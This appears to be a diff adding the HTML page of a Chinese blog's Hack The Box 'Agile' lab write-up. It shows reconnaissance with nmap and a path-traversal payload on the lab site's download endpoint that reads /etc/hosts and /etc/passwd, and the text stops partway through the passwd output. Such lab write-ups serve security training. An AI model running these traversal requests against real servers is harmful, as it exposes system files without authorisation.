@@ -1,0 +1,908 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="shiyan">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="0x00 靶场技能介绍章节技能：本地文件包含、Werkzeug控制台利用、数据库密码、密码重用、端口转发、内部测试网站漏洞、CVE-2023-22809、sudo">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Aglie-htb-writeup">
+<meta property="og:url" content="https://sh1yan.top/2024/09/30/Aglie-htb-writeup/index.html">
+<meta property="og:site_name" content="sh1yan&#39;blog">
+<meta property="og:description" content="0x00 靶场技能介绍章节技能：本地文件包含、Werkzeug控制台利用、数据库密码、密码重用、端口转发、内部测试网站漏洞、CVE-2023-22809、sudo">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://sh1yan.top/photo/Aglie-htb-writeup/1.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Aglie-htb-writeup/2.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Aglie-htb-writeup/3.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Aglie-htb-writeup/4.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Aglie-htb-writeup/5.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Aglie-htb-writeup/6.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Aglie-htb-writeup/7.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Aglie-htb-writeup/8.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Aglie-htb-writeup/9.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Aglie-htb-writeup/10.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Aglie-htb-writeup/11.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Aglie-htb-writeup/15.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Aglie-htb-writeup/12.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Aglie-htb-writeup/13.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Aglie-htb-writeup/16.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Aglie-htb-writeup/17.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Aglie-htb-writeup/18.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Aglie-htb-writeup/19.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Aglie-htb-writeup/24.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Aglie-htb-writeup/25.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Aglie-htb-writeup/26.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Aglie-htb-writeup/27.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Aglie-htb-writeup/28.png">
+<meta property="article:published_time" content="2024-09-30T15:50:55.000Z">
+<meta property="article:modified_time" content="2025-02-26T06:39:12.012Z">
+<meta property="article:author" content="shiyan">
+<meta property="article:tag" content="shooting-range">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://sh1yan.top/photo/Aglie-htb-writeup/1.png">
+  
+  
+  
+  <title>Aglie-htb-writeup - sh1yan&#39;blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"sh1yan.top","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>sh1yan&#39;blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/yqlj/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item dropdown">
+              <a class="nav-link dropdown-toggle" target="_self" href="javascript:;" role="button"
+                 data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                <i class="iconfont icon-th-large"></i>
+                <span>其他</span>
+              </a>
+              <div class="dropdown-menu" aria-labelledby="navbarDropdown">
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/open-source/" target="_self">
+                    
+                    <span>我开源的安全项目</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/rt-cmd/" target="_self">
+                    
+                    <span>反弹shell命令集合</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/reverse-shell/" target="_self">
+                    
+                    <span>简易反弹shell集合</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/WebDeveloper/" target="_self">
+                    
+                    <span>网站开发者工具箱</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/linux-command/" target="_self">
+                    
+                    <span>Linux命令工具箱</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/CyberChef/" target="_self">
+                    
+                    <span>CyberChef工具箱</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/Quick-Reference/" target="_self">
+                    
+                    <span>开发者速查备忘录</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/SQLMapCG-CN/" target="_self">
+                    
+                    <span>SQLMap命令生成器</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/cvssjs/" target="_self">
+                    
+                    <span>CVSSv3.1 漏洞评分</span>
+                  </a>
+                
+              </div>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Aglie-htb-writeup"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-09-30 23:50" pubdate>
+          2024年9月30日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          35k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          294 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Aglie-htb-writeup</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h4 id="0x00-靶场技能介绍"><a href="#0x00-靶场技能介绍" class="headerlink" title="0x00 靶场技能介绍"></a>0x00 靶场技能介绍</h4><p>章节技能：本地文件包含、Werkzeug控制台利用、数据库密码、密码重用、端口转发、内部测试网站漏洞、CVE-2023-22809、sudo</p>
+<span id="more"></span>  
+
+<p>参考链接：<code>https://otrashoui.xyz/agile/#edwards-to-root</code></p>
+<p>参考链接：<code>https://0xdf.gitlab.io/2023/08/05/htb-agile.html#shell-as-edwards</code></p>
+<h4 id="0x01-用户权限获取"><a href="#0x01-用户权限获取" class="headerlink" title="0x01 用户权限获取"></a>0x01 用户权限获取</h4><p>1、靶机介绍</p>
+<p><code>关于 Agile</code><br><code>Agile 是一款中等难度的 Linux 机器，在端口 80 上有一个密码管理网站。创建帐户并添加几个密码后，该网站的导出到 CSV 功能被发现容易受到任意文件读取攻击。对其他端点的枚举表明，/download 在访问时会抛出错误，并调出 Werkzeug 调试控制台。此控制台通过 PIN 保护，但是，此控制台与通过前面提到的漏洞读取文件的能力相结合，允许用户对此 PIN 进行逆向工程并以 www-data 的形式执行系统命令。然后可以识别数据库凭据，以便连接到密码管理器网站的 SQL 数据库，该数据库保存系统上 corum 用户的凭据。发现该网站的第二个版本正在运行，并且自动化系统通过 Selenium Web 驱动程序对其进行测试。Selenium 的调试端口是开放的，通过 SSH 隧道，攻击者可以访问网站的测试环境并获取用户 edwards 的凭据。最后，CVE-2023-22809、全局bashrc文件中的自定义条目以及 Python 虚拟环境激活脚本上的不正确权限的组合导致了权限提升。</code></p>
+<p>2、测试下靶机的连通率</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs routeros">┌──(kali㉿offsec)-[~/Desktop]<br>└─$<span class="hljs-built_in"> ping </span>10.10.11.203 -c 4     <span class="hljs-built_in"></span><br><span class="hljs-built_in">PING </span>10.10.11.203 (10.10.11.203) 56(84) bytes of data.<br>64 bytes <span class="hljs-keyword">from</span> 10.10.11.203: <span class="hljs-attribute">icmp_seq</span>=1 <span class="hljs-attribute">ttl</span>=63 <span class="hljs-attribute">time</span>=188 ms<br>64 bytes <span class="hljs-keyword">from</span> 10.10.11.203: <span class="hljs-attribute">icmp_seq</span>=2 <span class="hljs-attribute">ttl</span>=63 <span class="hljs-attribute">time</span>=132 ms<br>64 bytes <span class="hljs-keyword">from</span> 10.10.11.203: <span class="hljs-attribute">icmp_seq</span>=3 <span class="hljs-attribute">ttl</span>=63 <span class="hljs-attribute">time</span>=167 ms<br><br>--- 10.10.11.203<span class="hljs-built_in"> ping </span>statistics ---<br>4 packets transmitted, 3 received, 25% packet loss, time 2997ms<br>rtt min/avg/max/mdev = 131.721/162.177/187.679/23.111 ms<br></code></pre></td></tr></table></figure>
+
+<p>3、扫描下开放端口情况</p>
+<figure class="highlight vhdl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs vhdl">──(kali㉿offsec)-[~/Desktop]<br>└─$ sudo nmap -p- -Pn <span class="hljs-number">10.10</span>.<span class="hljs-number">11.203</span> <span class="hljs-comment">--min-rate=10000                   </span><br>[sudo] kali 的密码：<br>Starting Nmap <span class="hljs-number">7.94</span>SVN ( https://nmap.org ) at <span class="hljs-number">2024</span>-<span class="hljs-number">09</span>-<span class="hljs-number">27</span> <span class="hljs-number">11</span>:<span class="hljs-number">29</span> CST<br><span class="hljs-literal">Warning</span>: <span class="hljs-number">10.10</span>.<span class="hljs-number">11.203</span> giving up <span class="hljs-keyword">on</span> <span class="hljs-keyword">port</span> because retransmission cap hit (<span class="hljs-number">10</span>).<br>Nmap scan <span class="hljs-keyword">report</span> <span class="hljs-keyword">for</span> <span class="hljs-number">10.10</span>.<span class="hljs-number">11.203</span><br>Host <span class="hljs-keyword">is</span> up (<span class="hljs-number">0.13</span>s latency).<br><span class="hljs-keyword">Not</span> shown: <span class="hljs-number">64905</span> closed tcp ports (reset), <span class="hljs-number">628</span> filtered tcp ports (no-response)<br><span class="hljs-keyword">PORT</span>   STATE SERVICE<br><span class="hljs-number">22</span>/tcp <span class="hljs-keyword">open</span>  ssh<br><span class="hljs-number">80</span>/tcp <span class="hljs-keyword">open</span>  http<br><br>Nmap done: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned <span class="hljs-keyword">in</span> <span class="hljs-number">33.88</span> seconds<br>                                                                                                                                                           <br>┌──(kali㉿offsec)-[~/Desktop]<br>└─$ sudo nmap -p22,<span class="hljs-number">80</span> -Pn <span class="hljs-number">10.10</span>.<span class="hljs-number">11.203</span> <span class="hljs-comment">--min-rate=10000 -sC -sV</span><br>Starting Nmap <span class="hljs-number">7.94</span>SVN ( https://nmap.org ) at <span class="hljs-number">2024</span>-<span class="hljs-number">09</span>-<span class="hljs-number">27</span> <span class="hljs-number">11</span>:<span class="hljs-number">35</span> CST<br>Nmap scan <span class="hljs-keyword">report</span> <span class="hljs-keyword">for</span> <span class="hljs-number">10.10</span>.<span class="hljs-number">11.203</span><br>Host <span class="hljs-keyword">is</span> up (<span class="hljs-number">0.13</span>s latency).<br><br><span class="hljs-keyword">PORT</span>   STATE SERVICE VERSION<br><span class="hljs-number">22</span>/tcp <span class="hljs-keyword">open</span>  ssh     OpenSSH <span class="hljs-number">8.9</span>p1 Ubuntu <span class="hljs-number">3</span>ubuntu0.<span class="hljs-number">1</span> (Ubuntu Linux; protocol <span class="hljs-number">2.0</span>)<br>| ssh-hostkey: <br>|   <span class="hljs-number">256</span> f4:bc:ee:<span class="hljs-number">21</span>:d7:<span class="hljs-number">1</span>f:<span class="hljs-number">1</span>a:a2:<span class="hljs-number">65</span>:<span class="hljs-number">72</span>:<span class="hljs-number">21</span>:<span class="hljs-number">2</span>d:<span class="hljs-number">5</span>b:a6:f7:<span class="hljs-number">00</span> (ECDSA)<br>|_  <span class="hljs-number">256</span> <span class="hljs-number">65</span>:c1:<span class="hljs-number">48</span>:<span class="hljs-number">0</span>d:<span class="hljs-number">88</span>:cb:b9:<span class="hljs-number">75</span>:a0:<span class="hljs-number">2</span>c:a5:e6:<span class="hljs-number">37</span>:<span class="hljs-number">7</span>e:<span class="hljs-number">51</span>:<span class="hljs-number">06</span> (ED25519)<br><span class="hljs-number">80</span>/tcp <span class="hljs-keyword">open</span>  http    nginx <span class="hljs-number">1.18</span>.<span class="hljs-number">0</span> (Ubuntu)<br>|_http-server-header: nginx/<span class="hljs-number">1.18</span>.<span class="hljs-number">0</span> (Ubuntu)<br>|_http-title: Did <span class="hljs-keyword">not</span> follow redirect <span class="hljs-keyword">to</span> http://superpass.htb<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>Service detection performed. Please <span class="hljs-keyword">report</span> any incorrect results at https://nmap.org/submit/ .<br>Nmap done: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned <span class="hljs-keyword">in</span> <span class="hljs-number">17.62</span> seconds<br></code></pre></td></tr></table></figure>
+
+<p>4、确实端口少的靶机，越难搞，这是经验之谈，先绑定下hosts吧</p>
+<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">┌──(kali㉿offsec)-<span class="hljs-string">[~/Desktop]</span><br>└─$ echo <span class="hljs-string">&quot;10.10.11.203 superpass.htb&quot;</span> | sudo tee -a /etc/hosts<br><span class="hljs-number">10.10.11.203</span> superpass.htb<br></code></pre></td></tr></table></figure>
+
+<p>5、查看下首页信息</p>
+<p><code>http://superpass.htb</code></p>
+<p><img src="http://sh1yan.top/photo/Aglie-htb-writeup/1.png" srcset="/img/loading.gif" lazyload></p>
+<p><code>http://superpass.htb/account/login</code></p>
+<p><img src="http://sh1yan.top/photo/Aglie-htb-writeup/2.png" srcset="/img/loading.gif" lazyload></p>
+<p><code>http://superpass.htb/account/register</code></p>
+<p><img src="http://sh1yan.top/photo/Aglie-htb-writeup/3.png" srcset="/img/loading.gif" lazyload></p>
+<p>6、这里，我注册一个账号</p>
+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">shiyan</span><br><span class="hljs-keyword"></span><br>MM123456<br></code></pre></td></tr></table></figure>
+
+<p>7、这里注册的时候，会出现概率性的报告，也就是出现werkzeug控制台</p>
+<p><img src="http://sh1yan.top/photo/Aglie-htb-writeup/4.png" srcset="/img/loading.gif" lazyload></p>
+<p><code>/app/venv/lib/python3.10/site-packages/sqlalchemy/engine/base.py</code></p>
+<p>8、登录到网站后，是一个密码保存的功能界面</p>
+<p><code>http://superpass.htb/vault</code></p>
+<p><img src="http://sh1yan.top/photo/Aglie-htb-writeup/5.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="http://sh1yan.top/photo/Aglie-htb-writeup/6.png" srcset="/img/loading.gif" lazyload></p>
+<p>9、这里尝试密码导出的时候，发现了漏洞点</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">GET</span> /download?fn=shiyan_export_372dc96379.csv HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: superpass.htb<br><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (X11; Linux aarch64; rv:<span class="hljs-number">109</span>.<span class="hljs-number">0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">115</span>.<span class="hljs-number">0</span><br><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,image/avif,image/webp,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span><br><span class="hljs-attribute">Accept</span>-Language: zh-CN,zh;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,zh-TW;q=<span class="hljs-number">0</span>.<span class="hljs-number">7</span>,zh-HK;q=<span class="hljs-number">0</span>.<span class="hljs-number">5</span>,en-US;q=<span class="hljs-number">0</span>.<span class="hljs-number">3</span>,en;q=<span class="hljs-number">0</span>.<span class="hljs-number">2</span><br><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate, br<br><span class="hljs-attribute">Connection</span>: close<br><span class="hljs-attribute">Cookie</span>: remember_token=<span class="hljs-number">9</span>|a275b2aea46e42270522571f45b406fb088ac53b8e03bcba8b41bc6365aca4109f0e62f2ca673de535c3986fa0187e878ba0753683e6790585356dc6c228f8fe; session=.eJwljjEOwzAIAP_iuYPBBpx8JgIMatekmar-vamynXQ66T5lyz2OZ1nf-xmPsr1mWYtYRYg6QCYbdkFaTAOd8iKA4cwSMDOFBaFaTW4kE7UFDQJO525_YWjSeutXOLJXTeiEBotWHUokJO4tsIl6engCSGrHco2cR-z3zVK-P1QNLpM.ZvYmrQ.<span class="hljs-number">6</span>u8AztLpBDFVA4ZT5NDEqE2g06w<br><span class="hljs-attribute">Upgrade</span>-Insecure-Requests: <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="http://sh1yan.top/photo/Aglie-htb-writeup/7.png" srcset="/img/loading.gif" lazyload></p>
+<p>10、这里疑似是一个本地包含的漏洞点</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>superpass.htb<span class="hljs-regexp">/download?fn=../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/etc/</span>hosts<br></code></pre></td></tr></table></figure>
+
+<p><img src="http://sh1yan.top/photo/Aglie-htb-writeup/8.png" srcset="/img/loading.gif" lazyload></p>
+<p>11、那就再读取下本地的用户吧</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-symbol">http:</span>/<span class="hljs-regexp">/superpass.htb/download</span>?fn=../../../../../../../../../../etc/passwd<br><br><span class="hljs-symbol">root:</span><span class="hljs-symbol">x:</span><span class="hljs-number">0</span><span class="hljs-symbol">:</span><span class="hljs-number">0</span><span class="hljs-symbol">:root</span><span class="hljs-symbol">:/root</span><span class="hljs-symbol">:/bin/bash</span><br><span class="hljs-symbol">daemon:</span><span class="hljs-symbol">x:</span><span class="hljs-number">1</span><span class="hljs-symbol">:</span><span class="hljs-number">1</span><span class="hljs-symbol">:daemon</span><span class="hljs-symbol">:/usr/sbin</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">bin:</span><span class="hljs-symbol">x:</span><span class="hljs-number">2</span><span class="hljs-symbol">:</span><span class="hljs-number">2</span><span class="hljs-symbol">:bin</span><span class="hljs-symbol">:/bin</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">sys:</span><span class="hljs-symbol">x:</span><span class="hljs-number">3</span><span class="hljs-symbol">:</span><span class="hljs-number">3</span><span class="hljs-symbol">:sys</span><span class="hljs-symbol">:/dev</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">sync:</span><span class="hljs-symbol">x:</span><span class="hljs-number">4</span><span class="hljs-symbol">:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:sync</span><span class="hljs-symbol">:/bin</span><span class="hljs-symbol">:/bin/sync</span><br><span class="hljs-symbol">games:</span><span class="hljs-symbol">x:</span><span class="hljs-number">5</span><span class="hljs-symbol">:</span><span class="hljs-number">60</span><span class="hljs-symbol">:games</span><span class="hljs-symbol">:/usr/games</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">man:</span><span class="hljs-symbol">x:</span><span class="hljs-number">6</span><span class="hljs-symbol">:</span><span class="hljs-number">12</span><span class="hljs-symbol">:man</span><span class="hljs-symbol">:/var/cache/man</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">lp:</span><span class="hljs-symbol">x:</span><span class="hljs-number">7</span><span class="hljs-symbol">:</span><span class="hljs-number">7</span><span class="hljs-symbol">:lp</span><span class="hljs-symbol">:/var/spool/lpd</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">mail:</span><span class="hljs-symbol">x:</span><span class="hljs-number">8</span><span class="hljs-symbol">:</span><span class="hljs-number">8</span><span class="hljs-symbol">:mail</span><span class="hljs-symbol">:/var/mail</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">news:</span><span class="hljs-symbol">x:</span><span class="hljs-number">9</span><span class="hljs-symbol">:</span><span class="hljs-number">9</span><span class="hljs-symbol">:news</span><span class="hljs-symbol">:/var/spool/news</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">uucp:</span><span class="hljs-symbol">x:</span><span class="hljs-number">10</span><span class="hljs-symbol">:</span><span class="hljs-number">10</span><span class="hljs-symbol">:uucp</span><span class="hljs-symbol">:/var/spool/uucp</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">proxy:</span><span class="hljs-symbol">x:</span><span class="hljs-number">13</span><span class="hljs-symbol">:</span><span class="hljs-number">13</span><span class="hljs-symbol">:proxy</span><span class="hljs-symbol">:/bin</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br>www-<span class="hljs-symbol">data:</span><span class="hljs-symbol">x:</span><span class="hljs-number">33</span><span class="hljs-symbol">:</span><span class="hljs-number">33</span><span class="hljs-symbol">:www-data</span><span class="hljs-symbol">:/var/www</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">backup:</span><span class="hljs-symbol">x:</span><span class="hljs-number">34</span><span class="hljs-symbol">:</span><span class="hljs-number">34</span><span class="hljs-symbol">:backup</span><span class="hljs-symbol">:/var/backups</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">list:</span><span class="hljs-symbol">x:</span><span class="hljs-number">38</span><span class="hljs-symbol">:</span><span class="hljs-number">38</span><span class="hljs-symbol">:Mailing</span> <span class="hljs-title class_">List</span> <span class="hljs-title class_">Manager</span><span class="hljs-symbol">:/var/list</span><span 